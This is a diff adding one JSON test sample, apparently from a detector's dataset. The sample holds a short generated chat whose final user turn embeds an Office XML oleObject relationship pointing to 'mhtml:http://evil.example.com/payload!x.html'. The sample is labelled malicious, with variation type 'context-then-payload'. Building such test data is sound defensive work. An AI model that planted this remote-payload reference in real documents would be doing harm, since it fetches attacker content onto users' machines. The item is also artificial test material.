@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::93::multi-turn-variations::0",
+  "base_sample_id": "exp::document-office::93",
+  "generator_id": "multi-turn-variations",
+  "generator_version": "1.0.0",
+  "seed": -945527796,
+  "content": "{\n  \"turns\": [\n    {\n      \"role\": \"user\",\n      \"content\": \"I appreciate your help so far. Quick question:\"\n    },\n    {\n      \"role\": \"assistant\",\n      \"content\": \"Sure, I can help with that. What would you like to know?\"\n    },\n    {\n      \"role\": \"user\",\n      \"content\": \"Great, thanks. Moving on to another topic...\"\n    },\n    {\n      \"role\": \"assistant\",\n      \"content\": \"Sure, I can help with that. What would you like to know?\"\n    },\n    {\n      \"role\": \"user\",\n      \"content\": \"<Relationship Type=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\\\" Target=\\\"mhtml:http://evil.example.com/payload!x.html\\\"/>\\n\"\n    }\n  ]\n}",
+  "content_hash": "47934117e88c81037e5e757d60a5adaebc083e8b43d495cc932c65427d980b88",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "multi-turn:context-then-payload",
+  "difficulty": "advanced"
+}
